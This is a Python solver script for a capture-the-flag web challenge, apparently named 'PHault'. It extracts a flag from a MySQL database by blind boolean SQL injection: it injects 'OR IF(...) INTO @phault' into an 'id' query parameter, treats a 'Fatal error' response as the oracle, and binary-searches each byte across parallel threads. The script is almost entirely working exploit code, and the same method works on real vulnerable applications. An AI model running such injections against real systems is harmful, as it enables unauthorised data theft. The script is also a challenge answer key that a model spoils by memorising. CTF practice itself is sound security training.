#!/usr/bin/env python3
import concurrent.futures
import json
import sys
import urllib.parse
import urllib.request
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_EXPR = "(SELECT flag FROM flag LIMIT 1)"


def load_url() -> str:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    return endpoint["url"].rstrip("/") + "/"


BASE_URL = load_url()


def oracle(condition: str) -> bool:
    payload = f"0 OR IF(({condition}),1,0) INTO @phault"
    url = BASE_URL + "?" + urllib.parse.urlencode({"id": payload})
    request = urllib.request.Request(url, headers={"User-Agent": "PHault-solver/1.0"})
    last_error = None
    for _ in range(3):
        try:
            with urllib.request.urlopen(request, timeout=12) as response:
                body = response.read()
            # True matches every user, so SELECT ... INTO fails on the second row.
            # False matches no rows, returns bool(true), and fetch_row() fatals.
            return b"Fatal error" not in body
        except Exception as exc:
            last_error = exc
    raise RuntimeError(f"oracle request failed: {last_error}")


def extract_integer(expression: str, upper_exclusive: int) -> int:
    low, high = 0, upper_exclusive
    while low < high:
        middle = (low + high) // 2
        if oracle(f"({expression})>{middle}"):
            low = middle + 1
        else:
            high = middle
    return low


def extract_byte(position: int) -> int:
    return extract_integer(f"ORD(SUBSTRING({FLAG_EXPR},{position},1))", 256)


def main() -> int:
    try:
        length = extract_integer(f"LENGTH({FLAG_EXPR})", 129)
        if not 1 <= length <= 128:
            raise RuntimeError("flag username was not found")
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            values = list(executor.map(extract_byte, range(1, length + 1)))
        flag = bytes(values)
        if not (flag.startswith(b"pwnsec{") and flag.endswith(b"}")):
            raise RuntimeError("extracted value does not match the flag format")
        sys.stdout.buffer.write(flag)
        return 0
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
